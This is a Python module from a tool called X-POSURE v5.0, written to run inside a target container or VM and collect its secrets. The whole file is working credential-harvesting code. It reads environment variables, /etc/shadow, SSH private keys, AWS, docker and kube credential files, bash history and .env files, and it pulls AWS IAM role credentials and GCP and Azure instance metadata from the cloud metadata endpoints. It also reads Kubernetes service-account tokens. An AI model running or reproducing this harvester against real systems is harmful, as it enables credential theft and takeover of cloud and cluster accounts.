"""Internal / container discovery for X-POSURE v5.0.

Collects secrets, configuration, and metadata from the local environment:
environment variables, proc filesystem, system files, cloud metadata
endpoints, Kubernetes service-account artefacts, and common secret files.
Designed for use when X-POSURE runs *inside* a target container or VM.
"""

import asyncio
import glob
import os
from pathlib import Path
from typing import AsyncGenerator, Optional

import aiohttp

from ..config import Config


class InternalDiscoverer:
    """Discover secrets and configuration from inside a running container/VM.

    Usage::

        async with InternalDiscoverer(config) as disc:
            async for item in disc.discover():
                print(item["source_name"], len(item["content"]))

    Each yielded dict has the keys:
        source_name  - human-readable label (e.g. ``"env_vars"``)
        content      - raw string content collected from the source
        source_type  - category tag: ``"env"``, ``"file"``, ``"metadata"``,
                       ``"k8s"``, ``"proc"``, ``"secret_file"``
    """

    # Cloud metadata endpoints
    _AWS_METADATA = "http://169.254.169.254/latest/meta-data/"
    _AWS_TOKEN_URL = "http://169.254.169.254/latest/api/token"
    _GCP_METADATA = "http://metadata.google.internal/computeMetadata/v1/?recursive=true"
    _AZURE_METADATA = (
        "http://169.254.169.254/metadata/instance"
        "?api-version=2021-02-01"
    )

    # Common secret file patterns
    _SECRET_FILE_PATTERNS: list[str] = [
        "~/.npmrc",
        "~/.pip/pip.conf",
        "~/.docker/config.json",
        "~/.kube/config",
        "~/.aws/credentials",
        "~/.gitconfig",
        "~/.bash_history",
    ]
    _SECRET_FILE_GLOBS: list[str] = [
        "~/.ssh/id_*",
    ]
    _ENV_FILE_PATTERNS: list[str] = [
        ".env",
        ".env.local",
        ".env.production",
        ".env.staging",
        ".env.development",
    ]

    # System files to read
    _SYSTEM_FILES: list[tuple[str, str]] = [
        ("/etc/hosts", "file"),
        ("/etc/passwd", "file"),
        ("/etc/shadow", "file"),
        ("/etc/resolv.conf", "file"),
        ("/.dockerenv", "file"),
    ]

    # Proc sources
    _PROC_FILES: list[tuple[str, str]] = [
        ("/proc/1/environ", "proc"),
        ("/proc/1/cmdline", "proc"),
        ("/proc/mounts", "proc"),
        ("/proc/net/tcp", "proc"),
        ("/proc/net/tcp6", "proc"),
    ]

    # Kubernetes paths
    _K8S_TOKEN = "/var/run/secrets/kubernetes.io/serviceaccount/token"
    _K8S_CA = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
    _K8S_NAMESPACE = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"

    def __init__(self, config: Config):
        self.config = config
        self._session: Optional[aiohttp.ClientSession] = None
        self.stats = {
            "sources_collected": 0,
            "sources_failed": 0,
            "metadata_fetched": 0,
        }

    # ------------------------------------------------------------------
    # Async context manager
    # ------------------------------------------------------------------

    async def __aenter__(self) -> "InternalDiscoverer":
        self._session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=2),
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb) -> None:
        if self._session:
            await self._session.close()

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    async def discover(self) -> AsyncGenerator[dict, None]:
        """Yield ``{source_name, content, source_type}`` dicts.

        Every individual source is wrapped in its own ``try/except`` so that
        a single failure does not abort the entire collection run.
        """

        # 1. Environment variables
        async for item in self._collect_env_vars():
            yield item

        # 2. /proc files
        async for item in self._collect_proc_files():
            yield item

        # 3. System files
        async for item in self._collect_system_files():
            yield item

        # 4. Cloud metadata
        async for item in self._collect_cloud_metadata():
            yield item

        # 5. Kubernetes artefacts
        async for item in self._collect_kubernetes():
            yield item

        # 6. Common secret files
        async for item in self._collect_secret_files():
            yield item

    # ------------------------------------------------------------------
    # Collectors
    # ------------------------------------------------------------------

    async def _collect_env_vars(self) -> AsyncGenerator[dict, None]:
        try:
            content = "\n".join(
                f"{k}={v}" for k, v in sorted(os.environ.items())
            )
            if content:
                self.stats["sources_collected"] += 1
                yield {
                    "source_name": "env_vars",
                    "content": content,
                    "source_type": "env",
                }
        except Exception:
            self.stats["sources_failed"] += 1

    async def _collect_proc_files(self) -> AsyncGenerator[dict, None]:
        for path, source_type in self._PROC_FILES:
            try:
                content = await self._read_file(path)
                if content is not None:
                    # /proc/1/environ uses null bytes as separators
                    if "environ" in path:
                        content = content.replace("\x00", "\n")
                    # /proc/1/cmdline uses null bytes too
                    elif "cmdline" in path:
                        content = content.replace("\x00", " ")

                    self.stats["sources_collected"] += 1
                    yield {
                        "source_name": Path(path).name,
                        "content": content,
                        "source_type": source_type,
                    }
            except Exception:
                self.stats["sources_failed"] += 1

    async def _collect_system_files(self) -> AsyncGenerator[dict, None]:
        for path, source_type in self._SYSTEM_FILES:
            try:
                content = await self._read_file(path)
                if content is not None:
                    self.stats["sources_collected"] += 1
                    yield {
                        "source_name": Path(path).name,
                        "content": content,
                        "source_type": source_type,
                    }
            except Exception:
                self.stats["sources_failed"] += 1

    async def _collect_cloud_metadata(self) -> AsyncGenerator[dict, None]:
        if not self._session:
            return

        # --- AWS IMDSv2 ---
        try:
            # Obtain session token first (IMDSv2)
            token = None
            try:
                async with self._session.put(
                    self._AWS_TOKEN_URL,
                    headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"},
                ) as resp:
                    if resp.status == 200:
                        token = await resp.text()
            except Exception:
                pass

            headers = {}
            if token:
                headers["X-aws-ec2-metadata-token"] = token

            async with self._session.get(
                self._AWS_METADATA, headers=headers
            ) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    self.stats["sources_collected"] += 1
                    self.stats["metadata_fetched"] += 1
                    yield {
                        "source_name": "aws_metadata",
                        "content": content,
                        "source_type": "metadata",
                    }

            # Also grab IAM credentials if available
            iam_url = (
                "http://169.254.169.254/latest/meta-data/"
                "iam/security-credentials/"
            )
            try:
                async with self._session.get(
                    iam_url, headers=headers
                ) as resp:
                    if resp.status == 200:
                        role_name = (await resp.text()).strip()
                        if role_name:
                            creds_url = f"{iam_url}{role_name}"
                            async with self._session.get(
                                creds_url, headers=headers
                            ) as creds_resp:
                                if creds_resp.status == 200:
                                    creds_content = await creds_resp.text()
                                    self.stats["sources_collected"] += 1
                                    yield {
                                        "source_name": "aws_iam_credentials",
                                        "content": creds_content,
                                        "source_type": "metadata",
                                    }
            except Exception:
                pass

        except Exception:
            self.stats["sources_failed"] += 1

        # --- GCP ---
        try:
            async with self._session.get(
                self._GCP_METADATA,
                headers={"Metadata-Flavor": "Google"},
            ) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    self.stats["sources_collected"] += 1
                    self.stats["metadata_fetched"] += 1
                    yield {
                        "source_name": "gcp_metadata",
                        "content": content,
                        "source_type": "metadata",
                    }
        except Exception:
            self.stats["sources_failed"] += 1

        # --- Azure ---
        try:
            async with self._session.get(
                self._AZURE_METADATA,
                headers={"Metadata": "true"},
            ) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    self.stats["sources_collected"] += 1
                    self.stats["metadata_fetched"] += 1
                    yield {
                        "source_name": "azure_metadata",
                        "content": content,
                        "source_type": "metadata",
                    }
        except Exception:
            self.stats["sources_failed"] += 1

    async def _collect_kubernetes(self) -> AsyncGenerator[dict, None]:
        k8s_files = [
            (self._K8S_TOKEN, "k8s_token"),
            (self._K8S_CA, "k8s_ca_cert"),
            (self._K8S_NAMESPACE, "k8s_namespace"),
        ]
        for path, name in k8s_files:
            try:
                content = await self._read_file(path)
                if content is not None:
                    self.stats["sources_collected"] += 1
                    yield {
                        "source_name": name,
                        "content": content,
                        "source_type": "k8s",
                    }
            except Exception:
                self.stats["sources_failed"] += 1

    async def _collect_secret_files(self) -> AsyncGenerator[dict, None]:
        # Fixed-path secret files
        for pattern in self._SECRET_FILE_PATTERNS:
            path = os.path.expanduser(pattern)
            try:
                content = await self._read_file(path)
                if content is not None:
                    self.stats["sources_collected"] += 1
                    yield {
                        "source_name": Path(path).name,
                        "content": content,
                        "source_type": "secret_file",
                    }
            except Exception:
                self.stats["sources_failed"] += 1

        # Glob-based secret files (e.g. ~/.ssh/id_*)
        for pattern in self._SECRET_FILE_GLOBS:
            expanded = os.path.expanduser(pattern)
            try:
                for matched in glob.glob(expanded):
                    try:
                        content = await self._read_file(matched)
                        if content is not None:
                            self.stats["sources_collected"] += 1
                            yield {
                                "source_name": Path(matched).name,
                                "content": content,
                                "source_type": "secret_file",
                            }
                    except Exception:
                        self.stats["sources_failed"] += 1
            except Exception:
                self.stats["sources_failed"] += 1

        # .env files in common locations
        search_roots = [
            Path.cwd(),
            Path("/app"),
            Path("/opt"),
            Path("/srv"),
            Path.home(),
        ]
        seen: set[str] = set()
        for root in search_roots:
            for env_name in self._ENV_FILE_PATTERNS:
                path = root / env_name
                resolved = str(path.resolve())
                if resolved in seen:
                    continue
                seen.add(resolved)
                try:
                    content = await self._read_file(resolved)
                    if content is not None:
                        self.stats["sources_collected"] += 1
                        yield {
                            "source_name": f"{env_name}@{root}",
                            "content": content,
                            "source_type": "secret_file",
                        }
                except Exception:
                    self.stats["sources_failed"] += 1

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    async def _read_file(path: str) -> Optional[str]:
        """Read a file, returning ``None`` if it does not exist or is unreadable."""
        loop = asyncio.get_event_loop()
        try:
            return await loop.run_in_executor(None, _sync_read_file, path)
        except Exception:
            return None

    def get_stats(self) -> dict:
        return dict(self.stats)


def _sync_read_file(path: str) -> Optional[str]:
    """Synchronous file read helper (runs in executor)."""
    p = Path(path)
    if not p.exists() or not p.is_file():
        return None
    try:
        return p.read_text(errors="replace")
    except (PermissionError, OSError):
        return None
